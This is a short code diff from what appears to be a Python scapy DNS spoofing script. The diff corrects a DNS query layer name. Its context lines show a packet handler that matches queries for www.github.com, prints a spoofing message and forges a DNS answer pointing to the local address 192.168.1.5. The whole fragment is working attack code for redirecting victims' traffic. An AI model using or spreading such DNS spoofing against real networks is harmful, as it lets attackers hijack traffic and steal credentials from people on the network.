@@ -9,7 +9,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         # print(scapy_packet.show())
         
-        q_name = scapy_packet[scapy.DNSRQ].qname
+        q_name = scapy_packet[scapy.DNSQR].qname
         if "www.github.com" in q_name:
             print("[+] Spoofing target ")
             answer = scapy.DNSRR(rrname=q_name, rdata="192.168.1.5")
